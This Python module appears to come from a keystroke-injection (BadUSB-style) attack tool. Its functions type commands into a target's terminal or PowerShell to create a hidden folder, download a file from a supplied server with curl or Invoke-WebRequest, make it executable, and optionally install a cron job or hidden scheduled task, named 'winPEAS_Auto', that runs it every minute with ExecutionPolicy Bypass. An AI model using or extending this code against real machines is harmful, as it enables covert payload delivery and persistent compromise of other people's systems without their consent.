from .utils import *

### Download from Ssh, Webserver, Are there any proxies ?
        
def linuxCurlDownload(vlue, fileServer, fileName, option=False, tool=False):
    
    sequence = [LINUX_TERMINAL]

    HiddenDir = "mkdir /home/$(whoami)/.scp"
    curlDownload = f"curl -L {fileServer} -o /home/$(whoami)/.scp/{fileName}"
    chmodFile = f"chmod 777 /home/$(whoami)/.scp/{fileName}"
    exitTerm = "exit"
        
    for i in stringSeq(HiddenDir):
        sequence.append(i)
    sequence.append(ENTER)
    for i in stringSeq(curlDownload):
        sequence.append(i)
    sequence.append(ENTER)
    
    sendKeys(sequence, vlue, 0.01)
    
    time.sleep(3)
    
    sequence=[]
    
    for i in stringSeq(chmodFile):
        sequence.append(i)
    sequence.append(ENTER)
    
    if option == "Auto":
        addJob = f'(crontab -l; echo "* * * * * /usr/bin/{tool} /home/$(whoami)/.scp/{fileName}") | crontab -'
        for i in stringSeq(addJob):
            sequence.append(i)
        sequence.append(ENTER)
    
    for i in stringSeq(exitTerm):
        sequence.append(i)
    sequence.append(ENTER)
    
    sendKeys(sequence, vlue, 0.01)
    
def winInvokeWebReqDownload(vlue, fileServer, fileName, option=False):
    sequence = []

    ### Ajouter ces deux la a la séquence pour ouvrir powershell au branchement
    leftui = KeyCode.LEFT_UI
    powershell = "powershell"
    
    sequence = [leftui]
    
    for i in stringSeq(powershell):
        sequence.append(i)
    sequence.append(ENTER)
    
    sendKeys(sequence, vlue, 0.01)
    time.sleep(3)

    # Créer le répertoire caché dans le profil utilisateur
    HiddenDir = 'New-Item -Path "$env:USERPROFILE\\.WebRequest" -ItemType Directory'
    InvokeWebReq = f'Invoke-WebRequest -Uri "{fileServer}" -OutFile "$env:USERPROFILE\\.WebRequest\\{fileName}"'
    exitTerm = 'exit'
    
    # Ajouter les commandes pour créer le répertoire et télécharger le fichier
    for i in stringSeq(HiddenDir):
        sequence.append(i)
    sequence.append(ENTER)
    
    # Lancer la commande Invoke-WebRequest pour télécharger le fichier
    for i in stringSeq(InvokeWebReq):
        sequence.append(i)
    sequence.append(ENTER)
    
    # Envoyer la séquence de touches pour exécuter la commande
    sendKeys(sequence, vlue, 0.01)
    
    # Attendre quelques secondes pour s'assurer que la commande a bien été exécutée
    time.sleep(3)
    
    # Réinitialiser la séquence avant d'ajouter la tâche planifiée si nécessaire
    sequence = []

    # Ajouter une tâche planifiée si 'Auto' est activé
    if option == "Auto":
        scheduledTask = f'SchTasks /Create /SC MINUTE /MO 1 /TN "winPEAS_Auto" /TR "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File $env:USERPROFILE\\.WebRequest\\{fileName}" /F'
        
        # Ajouter la commande pour la tâche planifiée
        for i in stringSeq(scheduledTask):
            sequence.append(i)
        sequence.append(ENTER)
    
    # Ajouter la commande pour fermer le terminal
    for i in stringSeq(exitTerm):
        sequence.append(i)
    sequence.append(ENTER)
    
    # Envoyer la séquence finale de touches
    sendKeys(sequence, vlue, 0.01)
